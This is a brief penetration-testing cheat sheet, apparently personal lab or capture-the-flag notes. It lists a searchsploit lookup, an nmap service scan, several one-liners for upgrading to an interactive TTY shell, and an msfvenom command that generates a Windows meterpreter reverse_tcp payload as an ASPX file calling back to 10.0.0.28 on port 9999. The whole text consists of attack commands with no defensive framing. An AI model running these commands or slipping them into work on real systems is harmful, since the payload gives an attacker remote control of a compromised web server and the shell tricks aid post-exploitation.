* `searchsploit`
* `nmap -sV -sC <host address>`
* Spawning a TTY shell
  * `python -c 'import pty; pty.spawn("/bin/sh")'`
  * `echo os.system('/bin/bash')`
  * `/bin/sh -i`

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.28 LPORT=9999 -f aspx 
```



